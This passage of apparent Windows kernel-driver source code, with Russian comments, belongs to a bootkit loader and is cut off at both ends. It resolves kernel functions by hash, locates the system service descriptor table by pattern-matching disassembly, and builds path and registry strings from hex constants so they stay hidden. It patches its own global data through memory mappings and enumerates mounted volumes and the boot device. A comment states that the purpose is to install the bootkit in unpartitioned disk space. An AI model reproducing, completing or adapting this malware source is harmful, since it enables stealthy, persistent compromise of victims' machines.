//         UNICODE_STRING uFileName;
// 
//         pCommonBlock->fnRtlInitUnicodeString(&uFileName, L"\\??\\C:\\Windows\\temp\\123.tmp"/*(PCWSTR)(pPayload - sizeof(exploit_startup_header_t))*/);
//         InitializeObjectAttributes(&objAttrs, &uFileName, OBJ_CASE_INSENSITIVE, 0, NULL);
// 
//         ntStatus = pCommonBlock->fnZwCreateFile(&hFile, FILE_WRITE_DATA + SYNCHRONIZE, &objAttrs, &ioStatus, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_WRITE,
//             FILE_OPEN_IF, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
// 
//         if (ntStatus == STATUS_SUCCESS) {
//             pCommonBlock->fnZwClose(hFile);
//         }
//     }
#endif // _DEBUG

#ifdef _SOLID_DRIVER

#if _NON_STD_DRIVER

#ifdef _WIN64
    fncommon_fix_addr_value((uint8_t*)getGlobalDataPtr, 11, GLOBAL_DATA_PATTERN, pGlobalBlock);
#else
    fncommon_fix_addr_value((uint8_t*)driverBase, ((PIMAGE_NT_HEADERS)((uint8_t*)driverBase + (LONG)((PIMAGE_DOS_HEADER)driverBase)->e_lfanew))->OptionalHeader.SizeOfImage, GLOBAL_DATA_PATTERN, pGlobalBlock);
#endif

#else

    {
        WP_GLOBALS wpGlobals;
        PSYSTEM_MODULE_INFORMATIONS pModInfo = NULL;
        ulong_t AllocSize = 0;
        PSYSTEM_MODULE_INFORMATION pModPtr;
        char* namePtr;
        size_t len;
#if _WIN64
        uint8_t* fnGetGlobalDataPtr = (uint8_t*)getGlobalDataPtr;
        fnGetGlobalDataPtr += MOD_BASE;
#endif

        pCommonBlock->fnNtQuerySystemInformation(SystemModuleInformation, pModInfo, AllocSize, &AllocSize);

        pModInfo = (PSYSTEM_MODULE_INFORMATIONS)pCommonBlock->fnExAllocatePoolWithTag(NonPagedPool, AllocSize, LOADER_TAG);
        pCommonBlock->fnNtQuerySystemInformation(SystemModuleInformation, pModInfo, AllocSize, &AllocSize);

        pModPtr = (PSYSTEM_MODULE_INFORMATION)((uint8_t*)pModInfo + sizeof(ulong_t));

        for (i = 0; i < pModInfo->dwNum; ++i) {
            if (RtlStringCchLengthA(pModPtr[i].ImageName, 255, &len) == STATUS_SUCCESS) {
                namePtr = pModPtr[i].ImageName + len;
                while (*namePtr != '\\')
                    --namePtr;

                ++namePtr;

                if (*(uint32_t*)namePtr == 0x2E72646C/*"ldr."*/) {
                    modBase = (uintptr_t)pModPtr[i].Base;
                    break;
                }
            }
        }
#ifdef _WIN64
        wpGlobals.pMDL = pCommonBlock->fnIoAllocateMdl((void*)fnGetGlobalDataPtr, 11, FALSE, FALSE, NULL);
#else
        wpGlobals.pMDL = pCommonBlock->fnIoAllocateMdl((void*)modBase, ((PIMAGE_NT_HEADERS)(modBase + (uint8_t*)((PIMAGE_DOS_HEADER)modBase)->e_lfanew))->OptionalHeader.SizeOfImage, FALSE, FALSE, NULL);
#endif
        pCommonBlock->fnMmBuildMdlForNonPagedPool(wpGlobals.pMDL);
        wpGlobals.pMDL->MdlFlags = wpGlobals.pMDL->MdlFlags | MDL_MAPPED_TO_SYSTEM_VA;
        wpGlobals.ptr = pCommonBlock->fnMmMapLockedPages(wpGlobals.pMDL, KernelMode);

#ifdef _WIN64
        fncommon_fix_addr_value((uint8_t*)wpGlobals.ptr, 11, GLOBAL_DATA_PATTERN, pGlobalBlock);
#else
        fncommon_fix_addr_value((uint8_t*)wpGlobals.ptr, ((PIMAGE_NT_HEADERS)((uint8_t*)wpGlobals.ptr + (LONG)((PIMAGE_DOS_HEADER)wpGlobals.ptr)->e_lfanew))->OptionalHeader.SizeOfImage, GLOBAL_DATA_PATTERN, pGlobalBlock);
#endif
        if (wpGlobals.pMDL != NULL) {
            pCommonBlock->fnMmUnmapLockedPages(wpGlobals.ptr, wpGlobals.pMDL);
            pCommonBlock->fnIoFreeMdl(wpGlobals.pMDL);
        }
    }

    modBase = 0;

#endif

#else

#ifdef _WIN64
    fncommon_fix_addr_value((uint8_t*)getGlobalDataPtr, 11, GLOBAL_DATA_PATTERN, pGlobalBlock);
#else
    fncommon_fix_addr_value((uint8_t*)modBase + sizeof(mod_header_t), pModHeader->sizeOfMod, GLOBAL_DATA_PATTERN, pGlobalBlock);
#endif // _WIN64

#endif // _SOLID_DRIVER

// 
//     // Получаем адреса настроек, шеллкодов и таблиц...
//     pGlobalData->pCmnConfig = ((FnGetStaticConfig)fnGetCommonConfig)();

// 
    // Получаем версию системы и задаём соотвествующие смещения системных структур
    versionInfo.dwOSVersionInfoSize = sizeof(RTL_OSVERSIONINFOEXW);
    pCommonBlock->fnRtlGetVersion((PRTL_OSVERSIONINFOW)&versionInfo);
    pGlobalBlock->osMajorVersion = versionInfo.dwMajorVersion;
    pGlobalBlock->osMinorVersion = versionInfo.dwMinorVersion;
    pGlobalBlock->osSPMajorVersion = versionInfo.wServicePackMajor;
    pGlobalBlock->osSPMinorVersion = versionInfo.wServicePackMinor;    
    pGlobalBlock->osProductType = versionInfo.wProductType;

// #ifdef _WIN64
//     __debugbreak();
// #else
//     __asm int 3
// #endif // _WIN64

#ifdef _WIN64
    {
        uint8_t* pFunc = (uint8_t*)fnpe_find_export_by_hash(kernBase, KeAddSystemServiceTable_Hash, fncommon_calc_hash);

        if (pFunc != NULL) {
            dissasm_info_t hde;
            uint8_t* ptr = pFunc;

            for (i = 0; i < 0x40; ) {
                pGlobalBlock->pCommonBlock->fndissasm(ptr, &hde);

                //ud_set_input_buffer(&ud_obj, Inst, MAX_INST_LEN);

                /*
                    Check for the following code

                    nt!KeAddSystemServiceTable:
                    fffff800`012471c0 448b542428         mov     r10d,dword ptr [rsp+28h]
                    fffff800`012471c5 4183fa01           cmp     r10d,1
                    fffff800`012471c9 0f871ab70c00       ja      nt!KeAddSystemServiceTable+0x78
                    fffff800`012471cf 498bc2             mov     rax,r10
                    fffff800`012471d2 4c8d1d278edbff     lea     r11,0xfffff800`01000000
                    fffff800`012471d9 48c1e005           shl     rax,5
                    fffff800`012471dd 4a83bc1880bb170000 cmp     qword ptr [rax+r11+17BB80h],0
                    fffff800`012471e6 0f85fdb60c00       jne     nt!KeAddSystemServiceTable+0x78
                */

                if ((*(PULONG)ptr & 0x00ffffff) == 0x1d8d4c && (*(PUSHORT)(ptr + 0x0b) == 0x834b || *(PUSHORT)(ptr + 0x0b) == 0x834a)) {
                    // clculate nt!KeServiceDescriptorTableAddress
                    LARGE_INTEGER Addr;
                    Addr.QuadPart = (ULONGLONG)ptr + hde.len;
                    Addr.LowPart += *(PULONG)(ptr + 0x03) + *(PULONG)(ptr + 0x0f);

                    pCommonBlock->pKeServiceDescriptorTable = (void*)Addr.QuadPart;

                    break;
                }

                ptr += hde.len;
            }
        }
    }

    if (pCommonBlock->pKeServiceDescriptorTable != NULL)
        pCommonBlock->pKiServiceTable = pCommonBlock->pKeServiceDescriptorTable->KiServiceTable;

#else
    pCommonBlock->pKeServiceDescriptorTable = fnpe_find_export_by_hash(kernBase, KeServiceDescriptorTable_Hash, fncommon_calc_hash);
    pCommonBlock->pKiServiceTable = pCommonBlock->pKeServiceDescriptorTable->KiServiceTable;
#endif

    // Получаем базовую информацию о системе
    pCommonBlock->fnNtQuerySystemInformation(SystemBasicInformation, (void*)&pGlobalBlock->systemInfo, sizeof(SYSTEM_BASIC_INFORMATION), NULL);

    // Инициализируем константные данные
     {
         uint8_t* ptr;
        uint8_t* ptr1;
        size_t len;
        HANDLE hReg;
        wchar_t tmpRegVal[128];

//         size_t szVal;
// 
//         ptr = (uint8_t*)pCommonBlock->systemRoot; // "\??\C:\"
//         *(((PUINT32)ptr)++) = 0x5C3F3F5C;    /* \??\ */
//         *((PUINT32)ptr) = 0x005C3A43;        /* C:\  */

//         ptr = (uint8_t*)pGlobalData->uModifier; // "%u"
//         *((PUINT32)ptr) = 0x00007525;    /* %u\0\0 */

        ptr = (uint8_t*)pCommonBlock->driverWord; // "\Driver"
        *(((PUINT32)ptr)++) = 0x0044005C; // \0\\0D
        *(((PUINT32)ptr)++) = 0x00690072; // \0r\0i
        *(((PUINT32)ptr)++) = 0x00650076; // \0v\0r
        *((PUINT32)ptr) = 0x00000072;     // \0r\0\0

        ptr = pCommonBlock->fnExAllocatePoolWithTag(NonPagedPool, sizeof(UNICODE_STRING) + 16/*sizeof("\Device")*/, LOADER_TAG);
        ptr1 = ptr + sizeof(UNICODE_STRING);
        *(((PUINT32)ptr1)++) = 0x0044005C;    /* \0\\0D */
        *(((PUINT32)ptr1)++) = 0x00760065;    // \0e\0v
        *(((PUINT32)ptr1)++) = 0x00630069;    // \0i\0c
        *((PUINT32)ptr1) = 0x00000065;        // \0e\0\0
        pCommonBlock->fnRtlInitUnicodeString((PUNICODE_STRING)ptr, (PCWSTR)(ptr + sizeof(UNICODE_STRING)));
        pCommonBlock->deviceStr = (PUNICODE_STRING)ptr;

        ptr = (UINT8*)pCommonBlock->driversPath; // \SystemRoot\system32\drivers\ //
        *(((PUINT32)ptr)++) = 0x0053005c;
        *(((PUINT32)ptr)++) = 0x00730079;
        *(((PUINT32)ptr)++) = 0x00650074;
        *(((PUINT32)ptr)++) = 0x0052006d;
        *(((PUINT32)ptr)++) = 0x006f006f;
        *(((PUINT32)ptr)++) = 0x005c0074;
        *(((PUINT32)ptr)++) = 0x00790073;
        *(((PUINT32)ptr)++) = 0x00740073;
        *(((PUINT32)ptr)++) = 0x006d0065;
        *(((PUINT32)ptr)++) = 0x00320033;
        *(((PUINT32)ptr)++) = 0x0064005c;
        *(((PUINT32)ptr)++) = 0x00690072;
        *(((PUINT32)ptr)++) = 0x00650076;
        *(((PUINT32)ptr)++) = 0x00730072;
        *(PUINT16)ptr = 0x0000005c;


        ptr = (uint8_t*)pCommonBlock->mountMgrDevName; // "\Device\MountPointManager"
        *(((PUINT32)ptr)++) = 0x0044005c;
        *(((PUINT32)ptr)++) = 0x00760065;
        *(((PUINT32)ptr)++) = 0x00630069;
        *(((PUINT32)ptr)++) = 0x005c0065;
        *(((PUINT32)ptr)++) = 0x006f004d;
        *(((PUINT32)ptr)++) = 0x006e0075;
        *(((PUINT32)ptr)++) = 0x00500074;
        *(((PUINT32)ptr)++) = 0x0069006f;
        *(((PUINT32)ptr)++) = 0x0074006e;
        *(((PUINT32)ptr)++) = 0x0061004d;
        *(((PUINT32)ptr)++) = 0x0061006e;
        *(((PUINT32)ptr)++) = 0x00650067;
        *(PUINT32)ptr = 0x000000072;

        ptr = (uint8_t*)pCommonBlock->partPrefix; // "\Device\Harddisk"
        *(((PUINT32)ptr)++) = 0x0044005c;
        *(((PUINT32)ptr)++) = 0x00760065;
        *(((PUINT32)ptr)++) = 0x00630069;
        *(((PUINT32)ptr)++) = 0x005c0065;
        *(((PUINT32)ptr)++) = 0x00610048;
        *(((PUINT32)ptr)++) = 0x00640072;
        *(((PUINT32)ptr)++) = 0x00690064;
        *(((PUINT32)ptr)++) = 0x006b0073;
        *(uint16_t*)ptr = 0x0000;

        ptr = (uint8_t*)pCommonBlock->partPostfix; // "\Partition"
        *(((PUINT32)ptr)++) = 0x0050005c;
        *(((PUINT32)ptr)++) = 0x00720061;
        *(((PUINT32)ptr)++) = 0x00690074;
        *(((PUINT32)ptr)++) = 0x00690074;
        *(((PUINT32)ptr)++) = 0x006e006f;
        *(uint16_t*)ptr = 0x0000;


        ptr = (uint8_t*)pCommonBlock->bootDevLink; // "\ArcName\multi(0)disk(0)rdisk(0)partition(1)"
        *(((PUINT32)ptr)++) = 0x0041005c;
        *(((PUINT32)ptr)++) = 0x00630072;
        *(((PUINT32)ptr)++) = 0x0061004e;
        *(((PUINT32)ptr)++) = 0x0065006d;
        *(((PUINT32)ptr)++) = 0x006d005c;
        *(((PUINT32)ptr)++) = 0x006c0075;
        *(((PUINT32)ptr)++) = 0x00690074;
        *(((PUINT32)ptr)++) = 0x00300028;
        *(((PUINT32)ptr)++) = 0x00640029;
        *(((PUINT32)ptr)++) = 0x00730069;
        *(((PUINT32)ptr)++) = 0x0028006b;
        *(((PUINT32)ptr)++) = 0x00290030;
        *(((PUINT32)ptr)++) = 0x00640072;
        *(((PUINT32)ptr)++) = 0x00730069;
        *(((PUINT32)ptr)++) = 0x0028006b;
        *(((PUINT32)ptr)++) = 0x00290030;
        *(((PUINT32)ptr)++) = 0x00610070;
        *(((PUINT32)ptr)++) = 0x00740072;
        *(((PUINT32)ptr)++) = 0x00740069;
        *(((PUINT32)ptr)++) = 0x006f0069;
        *(((PUINT32)ptr)++) = 0x0028006e;
        *(((PUINT32)ptr)++) = 0x00290031;
        *(uint16_t*)ptr = 0x0000;

//         for (i = 0; i < 10; ++i) {
//             pCommonBlock->diskNumbers[i] = (wchar_t)('0' + i);
//         }

        ptr = pCommonBlock->fnExAllocatePoolWithTag(NonPagedPool, sizeof(UNICODE_STRING) + 126/*\\Registry\\Machine\\Software\\Microsoft\\Windows NT\\CurrentVersion*/, LOADER_TAG);
        ptr1 = ptr + sizeof(UNICODE_STRING);
        *(((PUINT32)ptr1)++) = 0x0052005C;    // \0\\0R
        *(((PUINT32)ptr1)++) = 0x00670065;    // \0e\0g
        *(((PUINT32)ptr1)++) = 0x00730069;    // \0i\0s
        *(((PUINT32)ptr1)++) = 0x00720074;    // \0t\0r
        *(((PUINT32)ptr1)++) = 0x005C0079;    /* \0y\0\ */
        *(((PUINT32)ptr1)++) = 0x0061004D;    // \0M\0a
        *(((PUINT32)ptr1)++) = 0x00680063;    // \0c\0h
        *(((PUINT32)ptr1)++) = 0x006E0069;    // \0i\0n
        *(((PUINT32)ptr1)++) = 0x005C0065;    /* \0e\0\ */
        *(((PUINT32)ptr1)++) = 0x006F0053;    // \0S\0o
        *(((PUINT32)ptr1)++) = 0x00740066;    // \0f\0t
        *(((PUINT32)ptr1)++) = 0x00610077;    // \Ow\0a
        *(((PUINT32)ptr1)++) = 0x00650072;    // \Or\0e
        *(((PUINT32)ptr1)++) = 0x004D005C;    // \O\\0M
        *(((PUINT32)ptr1)++) = 0x00630069;    // \0i\0c
        *(((PUINT32)ptr1)++) = 0x006F0072;    // \0r\0o
        *(((PUINT32)ptr1)++) = 0x006F0073;    // \0s\0o
        *(((PUINT32)ptr1)++) = 0x00740066;    // \0f\0t
        *(((PUINT32)ptr1)++) = 0x0057005C;    // \0\\0W
        *(((PUINT32)ptr1)++) = 0x006E0069;    // \0i\0n
        *(((PUINT32)ptr1)++) = 0x006F0064;    // \0d\0o
        *(((PUINT32)ptr1)++) = 0x00730077;    // \0w\0s
        *(((PUINT32)ptr1)++) = 0x004E0020;    // \0 \0N
        *(((PUINT32)ptr1)++) = 0x005C0054;    /* \0T\0\ */
        *(((PUINT32)ptr1)++) = 0x00750043;    // \0C\0u
        *(((PUINT32)ptr1)++) = 0x00720072;    // \0r\0r
        *(((PUINT32)ptr1)++) = 0x006E0065;    // \0e\0n
        *(((PUINT32)ptr1)++) = 0x00560074;    // \0t\0V
        *(((PUINT32)ptr1)++) = 0x00720065;    // \0e\0r
        *(((PUINT32)ptr1)++) = 0x00690073;    // \0s\0i
        *(((PUINT32)ptr1)++) = 0x006E006F;    // \0o\0n
        *((uint16_t*)ptr1) = 0x0000;    // \0\0
        pCommonBlock->fnRtlInitUnicodeString((PUNICODE_STRING)ptr, (PCWSTR)(ptr + sizeof(UNICODE_STRING)));
        pCommonBlock->ntCurrVerKey = (PUNICODE_STRING)ptr;

        ptr = pCommonBlock->fnExAllocatePoolWithTag(NonPagedPool, sizeof(UNICODE_STRING) + 22/*sizeof("SystemRoot")*/, LOADER_TAG);
        ptr1 = ptr + sizeof(UNICODE_STRING);
        *(((PUINT32)ptr1)++) = 0x00790053;    // \0S\0y
        *(((PUINT32)ptr1)++) = 0x00740073;    // \0s\0t
        *(((PUINT32)ptr1)++) = 0x006D0065;    // \0e\0m
        *(((PUINT32)ptr1)++) = 0x006F0052;    // \0R\0o
        *(((PUINT32)ptr1)++) = 0x0074006F;    // \0o\0t
        *((uint16_t*)ptr1) = 0x0000;            // \0\0
        pCommonBlock->fnRtlInitUnicodeString((PUNICODE_STRING)ptr, (PCWSTR)(ptr + sizeof(UNICODE_STRING)));
        pCommonBlock->sysRootWord = (PUNICODE_STRING)ptr;

        // Возможно, здесь можно будет убрать бесконечный цикл...
        while (pCommonBlock->fnRegistryOpenKey(&hReg, pCommonBlock->ntCurrVerKey) != STATUS_SUCCESS) {
            pCommonBlock->fnKeDelayExecutionThread(KernelMode, FALSE, &delay);
        }

        tmpRegVal[0] = 0;
        pCommonBlock->fnRegistryReadValue(hReg, pCommonBlock->sysRootWord, (wchar_t*)tmpRegVal);
        len = pCommonBlock->fncommon_wcslen_s(tmpRegVal, 128);
        pCommonBlock->fnmemcpy(pCommonBlock->systemRootW, tmpRegVal, (len + 1) * sizeof(wchar_t));

        for (len = 0; len < pCommonBlock->fncommon_wcslen_s(pCommonBlock->systemRootW, 128); ++len) {
            pCommonBlock->systemRootA[len] = (char)pCommonBlock->systemRootW[len];
        }

        ptr = (UINT8*)(uint8_t*)pCommonBlock->sysVolInfoA;
        *(((PUINT32)ptr)++) = 0x74737953;
        *(((PUINT32)ptr)++) = 0x56206d65;
        *(((PUINT32)ptr)++) = 0x6d756c6f;
        *(((PUINT32)ptr)++) = 0x6e492065;
        *(((PUINT32)ptr)++) = 0x6d726f66;
        *(((PUINT32)ptr)++) = 0x6f697461;
        *(PUINT16)ptr = 0x006e;


        // CRYPTO
        ptr = (PUINT8)pCommonBlock->sigma;
        *(PUINT32)ptr = 0x25119779;     // 0x79,0x97,0x11,0x25
        *(++(PUINT32)ptr) = 0x88040785; // 0x85,0x07,0x04,0x88
        *(++(PUINT32)ptr) = 0x79777765; // 0x65,0x77,0x77,0x79
        *(++(PUINT32)ptr) = 0x11FADE99; // 0x99,0xDE,0xFA,0x11

        // static const unsigned char padding[64] =
        // {
        //  0x80, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
        //     0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
        //     0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
        //     0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
        // };
        ptr = (PUINT8)pCommonBlock->hashPadding;
        *ptr = 0x80;

        //static const char cb64[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        ptr = (PUINT8)pCommonBlock->base64;
        for (i = 65; i <= 90; ++i) {
            *ptr++ = (uint8_t)i;
        }
        for (i = 97; i <= 122; ++i) {
            *ptr++ = (uint8_t)i;
        }

        *(((PUINT32)ptr)++) = 0x33323130; // 0123
        *(((PUINT32)ptr)++) = 0x37363534; // 4567
        *(((PUINT32)ptr)++) = 0x2F2B3938; // 89+/
        *ptr = 0;

        //        pCommonBlock->aes_init_done = 0;
        pCommonBlock->asn1_hash_sha1[0] = 0x30;
        pCommonBlock->asn1_hash_sha1[1] = 0x21;
        pCommonBlock->asn1_hash_sha1[2] = 0x30;
        pCommonBlock->asn1_hash_sha1[3] = 0x09;
        pCommonBlock->asn1_hash_sha1[4] = 0x06;
        pCommonBlock->asn1_hash_sha1[5] = 0x05;
        pCommonBlock->asn1_hash_sha1[6] = 0x2b;
        pCommonBlock->asn1_hash_sha1[7] = 0x0e;
        pCommonBlock->asn1_hash_sha1[8] = 0x03;
        pCommonBlock->asn1_hash_sha1[9] = 0x02;
        pCommonBlock->asn1_hash_sha1[10] = 0x1a;
        pCommonBlock->asn1_hash_sha1[11] = 0x05;
        pCommonBlock->asn1_hash_sha1[12] = 0x00;
        pCommonBlock->asn1_hash_sha1[13] = 0x04;
        pCommonBlock->asn1_hash_sha1[14] = 0x14;
    }

    // Ищем базу и размер hal.dll и находим адреса нужных функций
    halBase = pCommonBlock->halBase = pCommonBlock->fncommon_find_base_by_driver_name(DRIVER_ACPI_HAL_HASH, &pCommonBlock->halSize);

#ifdef _WIN64
    pCommonBlock->fnKfAcquireSpinLock = (FnKfAcquireSpinLock)fnpe_find_export_by_hash(kernBase, KeAcquireSpinLockRaiseToDpc_Hash, fncommon_calc_hash);
    pCommonBlock->fnKfReleaseSpinLock = (FnKfReleaseSpinLock)fnpe_find_export_by_hash(kernBase, KeReleaseSpinLock_Hash, fncommon_calc_hash);    
#else
    DECLARE_SYSTEM_FUNC(pCommonBlock, KfAcquireSpinLock, halBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, KfReleaseSpinLock, halBase);
#endif

#ifdef _WIN64
    pCommonBlock->fnKeGetCurrentIrql = (FnKeGetCurrentIrql)((uint8_t*)keGetCurrentIrql /*+ DRIVER_BASE*/);
    pCommonBlock->fnKfRaiseIrql = (FnKfRaiseIrql)((uint8_t*)kfRaiseIrql /*+ DRIVER_BASE*/);
    pCommonBlock->fnKfLowerIrql = (FnKfLowerIrql)((uint8_t*)kfLowerIrql /*+ DRIVER_BASE*/);
#else
    DECLARE_SYSTEM_FUNC(pCommonBlock, KeGetCurrentIrql, halBase);    
    DECLARE_SYSTEM_FUNC(pCommonBlock, KfRaiseIrql, halBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, KfLowerIrql, halBase);
#endif

//     // Ждём загрузки драйвера NTFS.SYS.
//     for ( ; ; ) {
//         PSYSTEM_MODULE_INFORMATION_EX pModuleInfo;
//         DWORD len = 0;
//         char* moduleName;
//         bool_t bRes = FALSE;
// 
//         ntStatus = pCommonBlock->fnNtQuerySystemInformation(SystemModuleInformation, NULL, 0, &len);
// 
//         if (len == 0) {
//             fnKeDelayExecutionThread(KernelMode, FALSE, &delay);
//             continue;
//         }
// 
//         pCommonBlock->fncommon_allocate_memory(pCommonBlock, &pModuleInfo, len, NonPagedPool);
// 
//         ntStatus = pCommonBlock->fnNtQuerySystemInformation(SystemModuleInformation, pModuleInfo, len, &len);
// 
//         if (ntStatus != STATUS_SUCCESS) {
//             pCommonBlock->fnExFreePoolWithTag(pModuleInfo, LOADER_TAG);
//             fnKeDelayExecutionThread(KernelMode, FALSE, &delay);
//             continue;
//         }
// 
//         for (i = 0; i < pModuleInfo->ModulesCount; ++i)  {
//             moduleName = pModuleInfo->Modules[i].ImageName + pGlobalBlock->pCommonBlock->fnstrlen(pModuleInfo->Modules[i].ImageName);
//             for ( ; moduleName >= pModuleInfo->Modules[i].ImageName && *moduleName != '\\'; --moduleName);
//             ++moduleName;
//             if (pGlobalBlock->pCommonBlock->fncommon_calc_hash(moduleName, pGlobalBlock->pCommonBlock->fnstrlen(moduleName)) == NTFS_SYS_HASH) {
//                 bRes = TRUE;
//                 break;
//             }
//         }
// 
//         pCommonBlock->fnExFreePoolWithTag(pModuleInfo, LOADER_TAG);
// 
//         if (bRes) {
//             break;
//         }
//         fnKeDelayExecutionThread(KernelMode, FALSE, &delay);
//     }

    // Получаем информацию о дисках в системе и в зависимости от режима запуска, устанавливаем буткит в неразмеченную область.
    {
        pvolume_info_t pVolumeInfo = NULL;
        pvolume_list_entry_t pVolumeListEntry, pVolumeListItr;
        PDEVICE_OBJECT pMountMgrDevice;
        PFILE_OBJECT pMountMgrFile;
        PIRP pIrp;
        IO_STATUS_BLOCK ioStatus;
        KEVENT evt;
        MOUNTMGR_MOUNT_POINT mountPoint;
        PMOUNTMGR_MOUNT_POINTS pMountPoints;
        wchar_t* mountDevName = NULL;
        uint32_t size = sizeof(MOUNTMGR_MOUNT_POINTS);
        UNICODE_STRING uMntManagerName;

        pCommonBlock->fnRtlInitUnicodeString(&uMntManagerName, pCommonBlock->mountMgrDevName);
        ntStatus = pCommonBlock->fnIoGetDeviceObjectPointer(&uMntManagerName, FILE_READ_ATTRIBUTES, &pMountMgrFile, &pMountMgrDevice);

        if (NT_SUCCESS(ntStatus)/*pMountMgrDevice != NULL*/) {
            pCommonBlock->fncommon_allocate_memory(pCommonBlock, &pMountPoints, size, NonPagedPool);
            pCommonBlock->fnmemset(&mountPoint, 0, sizeof(MOUNTMGR_MOUNT_POINT));

            pGlobalBlock->pCommonBlock->fnKeInitializeEvent(&evt, NotificationEvent, FALSE);

            while (pIrp = pGlobalBlock->pCommonBlock->fnIoBuildDeviceIoControlRequest(IOCTL_MOUNTMGR_QUERY_POINTS, pMountMgrDevice, &mountPoint, sizeof(MOUNTMGR_MOUNT_POINT), pMountPoints, size, FALSE, &evt, &ioStatus)) {
                ntStatus = pGlobalBlock->pCommonBlock->fnIofCallDriver(pMountMgrDevice, pIrp);
                if (ntStatus == STATUS_PENDING) {
                    pGlobalBlock->pCommonBlock->fnKeWaitForSingleObject(&evt, Suspended, KernelMode, FALSE, NULL);
                    ntStatus = ioStatus.Status;
                }

                if (ntStatus != STATUS_BUFFER_OVERFLOW) {
                    break;
                }

                size = pMountPoints->Size;
                fnExFreePoolWithTag(pMountPoints, LOADER_TAG);
                pCommonBlock->fncommon_allocate_memory(pCommonBlock, &pMountPoints, size, NonPagedPool);
            }

            pCommonBlock->fnObfDereferenceObject(pMountMgrFile);

            // Пробегаемся по всем подключённым томам и пытаемся получить для каждого объект устройства.
            for (i = 0; i < pMountPoints->NumberOfMountPoints; ++i) {
                wchar_t *ptr, *end, *pLnkName;
                bool_t newVolume = TRUE;

                if (mountDevName != NULL) {
                    fnExFreePoolWithTag(mountDevName, LOADER_TAG);
                }

                if (pVolumeInfo == NULL) {
                    pCommonBlock->fncommon_allocate_memory(pCommonBlock, &pVolumeInfo, sizeof(volume_info_t), NonPagedPool);
                    pCommonBlock->fncommon_allocate_memory(pCommonBlock, &pVolumeListEntry, sizeof(volume_list_entry_t), NonPagedPool);
                    pVolumeListEntry->pVolumeInfo = pVolumeInfo;
                }

                size = pMountPoints->MountPoints[i].DeviceNameLength;
                pCommonBlock->fncommon_allocate_memory(pCommonBlock, &mountDevName, size + sizeof(wchar_t), NonPagedPool);
                pCommonBlock->fnmemcpy(mountDevName, (uint8_t*)pMountPoints + pMountPoints->MountPoints[i].DeviceNameOffset, size);

                pLnkName = (wchar_t*)((uint8_t*)pMountPoints + pMountPoints->MountPoints[i].SymbolicLinkNameOffset);

                end = pLnkName + (pMountPoints->MountPoints[i].SymbolicLinkNameLength >> 1);
                for (ptr = pLnkName; ptr < end; ++ptr) {
                    if (*ptr == L':') {
                        --ptr;
                        break;
                    }
                }

                // Ищем в списке найденных томов том с похожим именем (т. к. иногда попадаются одни и те же имена устройств).
                if (pCommonBlock->pVolumesListHead != NULL) {
                    pVolumeListItr = pCommonBlock->pVolumesListHead;
                    do {
                        if (pCommonBlock->fnRtlCompareMemory(pVolumeListItr->pVolumeInfo->devName, mountDevName, sizeof(pVolumeListItr->pVolumeInfo->devName)) == sizeof(pVolumeListItr->pVolumeInfo->devName)) {
                            newVolume = FALSE;
                            break;
                        }
                        pVolumeListItr = (pvolume_list_entry_t)((PLIST_ENTRY)pVolumeListItr)->Flink;
                    } while (pVolumeListItr != pCommonBlock->pVolumesListHead);

                    if (!newVolume) {
                        if (ptr < end) {
                            fncommon_check_system_disk(pVolumeListItr->pVolumeInfo, *ptr);
                        }
                        
                        continue;
                    }
                }

                pVolumeInfo->pDeviceObject = pCommonBlock->fncommon_dio_get_device_object_by_name(mountDevName, size / sizeof(wchar_t), pVolumeInfo);
                if (pVolumeInfo->pDeviceObject == NULL) {
                    continue;
                }

                if (ptr < end) {
                    fncommon_check_system_disk(pVolumeInfo, *ptr);
                }

                if (pCommonBlock->pVolumesListHead == NULL) {
                    pCommonBlock->fncommon_initialize_list_head((PLIST_ENTRY)pVolumeListEntry);
                    pCommonBlock->pVolumesListHead = pVolumeListEntry;
                }
                else {
                    pCommonBlock->fncommon_insert_tail_list((PLIST_ENTRY)pCommonBlock->pVolumesListHead, (PLIST_ENTRY)pVolumeListEntry);
                }

                pVolumeInfo = NULL;
            }

            if (pVolumeInfo != NULL) { // Удаляем ранее выделенный и не понадобившийся буфер.
                fnExFreePoolWithTag(pVolumeInfo, LOADER_TAG);
                fnExFreePoolWithTag(pVolumeListEntry, LOADER_TAG);
            }

            // Получаем имя устройства, описывающего загрузочный том.
            {
                UNICODE_STRING uName;
                OBJECT_ATTRIBUTES objAttrs;
                HANDLE handle1, handle2;
                wchar_t bootDevName[48];

                pCommonBlock->fnRtlInitUnicodeString(&uName, pCommonBlock->bootDevLink);

                InitializeObjectAttributes(&objAttrs, &uName, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
                do {
                    ntStatus = pCommonBlock->fnZwOpenSymbolicLinkObject(&handle1, GENERIC_READ, &objAttrs);

                    if (NT_SUCCESS(ntStatus) == FALSE) {
                        handle1 = NULL;
                        break;
                    }
                    uName.Buffer = bootDevName;
                    uName.Length = 0;
                    uName.MaximumLength = sizeof(bootDevName);

                    ntStatus = pCommonBlock->fnZwQuerySymbolicLinkObject(handle1, &uName, NULL);

                    if (NT_SUCCESS(ntStatus)) {
                        bootDevName[uName.Length >> 1] = 0;

                        InitializeObjectAttributes(&objAttrs, &uName, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
                        ntStatus = pCommonBlock->fnZwOpenSymbolicLinkObject(&handle2, GENERIC_READ, &objAttrs);

                        if (NT_SUCCESS(ntStatus) == FALSE) {
                            handle2 = NULL;
                            break;
                        }
                        uName.Buffer = bootDevName;
                        uName.Length = 0;
                        uName.MaximumLength = sizeof(bootDevName);

                        ntStatus = pCommonBlock->fnZwQuerySymbolicLinkObject(handle2, &uName, NULL);

                        if (NT_SUCCESS(ntStatus)) {
                            bootDevName[uName.Length >> 1] = 0;
                            if (pCommonBlock->pVolumesListHead != NULL) {
                                pVolumeListItr = pCommonBlock->pVolumesListHead;
                                do {
